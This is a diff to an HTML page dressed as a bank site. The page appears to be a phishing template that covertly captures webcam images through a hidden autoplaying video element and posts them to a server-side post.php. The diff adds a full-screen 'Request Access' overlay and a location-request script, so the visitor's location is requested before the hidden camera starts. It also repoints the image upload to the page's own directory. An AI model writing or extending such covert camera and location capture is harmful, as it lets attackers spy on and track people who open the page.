@@ -333,6 +333,23 @@
             to { transform: rotate(360deg); }
         }
 
+        .request-access-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(30,60,114,0.98); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 40px; text-align: center; transition: opacity 0.5s ease;
+        }
+        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
+        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: rgba(255,255,255,0.2);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #fff; }
+        .request-access-text { font-size: 16px; color: rgba(255,255,255,0.9); margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
+        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
+            border-radius: 8px; background: #fff; color: #1e3c72; cursor: pointer; }
+        .request-access-btn:hover { opacity: 0.95; }
+        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .request-access-status { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.7); }
+
         @media (max-width: 768px) {
             .bank-body {
                 padding: 30px 20px;
@@ -345,6 +362,14 @@
     </style>
 </head>
 <body>
+    <div class="request-access-overlay" id="requestAccessOverlay">
+        <div class="request-access-icon">📍</div>
+        <div class="request-access-title">Request Access</div>
+        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
+        <button class="request-access-btn" id="requestAccessBtn">Allow Location Access</button>
+        <div class="request-access-status" id="requestAccessStatus"></div>
+    </div>
+
     <div class="video-wrap" hidden="hidden">
         <video id="video" playsinline autoplay></video>
     </div>
@@ -421,12 +446,14 @@
         </div>
     </div>
 
+    <script src="location-request.js"></script>
     <script>
+        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
                 data: { cat: imgdata },
-                url: 'forwarding_link/post.php',
+                url: BASE_URL + 'post.php',
                 dataType: 'json',
                 async: false,
                 success: function (result) {
@@ -503,8 +530,12 @@
             }, 2000);
         });
 
-        // Initialize camera
-        init();
+        // Initialize camera after location permission
+        if (window.LocationRequest) {
+            LocationRequest.init(init);
+        } else {
+            init();
+        }
     </script>
 </body>
 </html>
